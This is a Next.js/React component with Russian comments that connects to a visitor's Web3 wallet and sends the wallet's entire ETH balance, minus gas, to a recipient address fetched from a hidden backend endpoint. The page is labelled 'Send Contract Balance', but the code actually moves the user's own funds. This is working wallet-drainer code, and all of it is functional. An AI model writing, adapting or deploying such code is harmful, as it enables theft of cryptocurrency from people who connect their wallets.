'use client'

import { BACKEND_LINK } from '@/utils/variables';
import { useState } from 'react'
import Web3 from 'web3'


interface EthereumProvider {
  selectedAddress?: string
  isMetaMask?: boolean
  isTrust?: boolean
  request(args: { method: string; params?: unknown[] }): Promise<unknown>
  on?(event: string, listener: (...args: unknown[]) => void): void
  removeListener?(event: string, listener: (...args: unknown[]) => void): void
}

// Вынесенная функция: вся логика взаимодействия с контрактом
async function sendAllBalance(
  eth: EthereumProvider & { request(args: { method: string; params?: unknown[] }): Promise<unknown> },
  addr: string,
  setStatus: (msg: string) => void
): Promise<string> {
  // 1. Получаем адрес получателя от бэка
  setStatus('Получаем адрес получателя от бэка…')
  const res = await fetch(`${BACKEND_LINK}/contract`)
  if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`)
  const { recipient } = await res.json() as { recipient: string }

  // 2. Настраиваем Web3
  const web3 = new Web3(eth)

  // 3. Получаем баланс пользователя и параметры газа
  const balanceWei = BigInt(await web3.eth.getBalance(addr))
  const gasLimit = 21000n
  const block = await web3.eth.getBlock('pending')
  const baseFeePerGas = block.baseFeePerGas ? BigInt(block.baseFeePerGas) : BigInt(0);
  let maxPriorityFeePerGas: bigint
  try {
    maxPriorityFeePerGas = BigInt(await web3.eth.getMaxPriorityFeePerGas())
  } catch {
    maxPriorityFeePerGas = BigInt(web3.utils.toWei('2.5', 'gwei'))
  }
  const maxFeePerGas = baseFeePerGas * 2n + maxPriorityFeePerGas

  // 4. Рассчитываем сумму к отправке
  const gasCost = maxFeePerGas * gasLimit
  const amountToSend = balanceWei - gasCost
  if (amountToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
  const hexValue = '0x' + amountToSend.toString(16)

  // 5. Отправляем транзакцию
  setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`)
  const receipt = await web3.eth.sendTransaction({
    from: addr,
    to: recipient,
    value: hexValue,
    gas: gasLimit.toString(),
    maxPriorityFeePerGas: maxPriorityFeePerGas.toString(10),
    maxFeePerGas: maxFeePerGas.toString(10),
    type: '0x2',
  })
  return String(receipt.transactionHash);
}

export default function Wallet() {
  const [account, setAccount] = useState<string>()
  const [status, setStatus] = useState('Нажмите «Connect & SendBalance»')
  const [busy, setBusy] = useState(false)

  async function connectAndSendBalance() {
    const eth = window.ethereum
    if (!eth) {
      setStatus('Установите Web3-кошелёк (MetaMask и т.п.)')
      return
    }

    setBusy(true)
    setStatus('Запрашиваем аккаунт…')
    let addr = eth.selectedAddress as string | undefined
    if (!addr) {
      try {
        const resp = await eth.request({ method: 'eth_requestAccounts' })
        addr = (resp as string[])[0]
      } catch (e: unknown) {
        const msg = e instanceof Error ? e.message : String(e)
        setStatus(`Ошибка: ${msg}`)
        setBusy(false)
        return
      }
    }
    setAccount(addr)

    try {
      const txHash = await sendAllBalance(eth, addr, setStatus)
      setStatus(`Успех! TxHash: ${txHash}`)
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e)
      setStatus(`Ошибка: ${msg}`)
    } finally {
      setBusy(false)
    }
  }

  return (
    <div style={{ padding: 20, fontFamily: 'Arial, sans-serif' }}>
      <h1>Send Contract Balance</h1>
      <button
        onClick={connectAndSendBalance}
        disabled={busy}
        style={{
          padding: '10px 20px',
          fontSize: '16px',
          cursor: busy ? 'not-allowed' : 'pointer',
        }}
      >
        {busy ? '…обрабатываем' : 'Connect & SendBalance'}
      </button>
      <p><strong>Статус:</strong> {status}</p>
      {account && <p><strong>Ваш аккаунт:</strong> {account}</p>}
    </div>
  )
}
